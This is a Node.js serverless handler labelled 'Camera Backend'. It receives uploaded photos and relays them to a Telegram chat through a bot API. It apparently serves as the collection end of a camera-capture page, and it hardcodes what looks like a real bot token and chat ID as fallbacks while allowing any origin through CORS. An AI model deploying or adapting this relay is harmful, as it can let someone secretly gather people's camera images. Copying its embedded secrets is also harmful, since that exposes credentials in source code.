const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');

// Vars (Hardcoded fallback for immediate stability)
const BOT_TOKEN = process.env.BOT_TOKEN || '8217603317:AAHbCjswpTeM2YMP-PdnBMZ8xvmfdr2jIug';
const CHAT_ID = process.env.CHAT_ID || '1603071848';

// Configure Multer
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

// Helper to run middleware
function runMiddleware(req, res, fn) {
    return new Promise((resolve, reject) => {
        fn(req, res, (result) => {
            if (result instanceof Error) {
                return reject(result);
            }
            return resolve(result);
        });
    });
}

// Main Handler
module.exports = async function handler(req, res) {
    // Enable CORS manually
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
    res.setHeader(
        'Access-Control-Allow-Headers',
        'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
    );

    // Handle OPTIONS (Preflight)
    if (req.method === 'OPTIONS') {
        res.statusCode = 200;
        res.end();
        return;
    }

    // Only allow POST
    if (req.method !== 'POST') {
        res.statusCode = 200;
        res.setHeader('Content-Type', 'text/plain');
        res.end('Camera Backend is Running! (V4 - Bulletproof)');
        return;
    }

    try {
        // Run Multer
        await runMiddleware(req, res, upload.single('photo'));

        if (!req.file) {
            res.statusCode = 400;
            res.setHeader('Content-Type', 'application/json');
            res.end(JSON.stringify({ error: 'No file uploaded' }));
            return;
        }

        console.log('Sending photo to Telegram...');

        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', req.file.buffer, {
            filename: 'photo.jpg',
            contentType: req.file.mimetype,
        });

        const telegramResponse = await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
            form,
            {
                headers: { ...form.getHeaders() },
            }
        );

        res.statusCode = 200;
        res.setHeader('Content-Type', 'application/json');
        res.end(JSON.stringify({ success: true, telegram: telegramResponse.data.ok }));

    } catch (error) {
        console.error('Error:', error.message);
        res.statusCode = 500;
        res.setHeader('Content-Type', 'application/json');
        res.end(JSON.stringify({
            error: error.response ? error.response.data.description : error.message
        }));
    }
};

// Disable Vercel body parser (CRITICAL)
module.exports.config = {
    api: {
        bodyParser: false,
    },
};
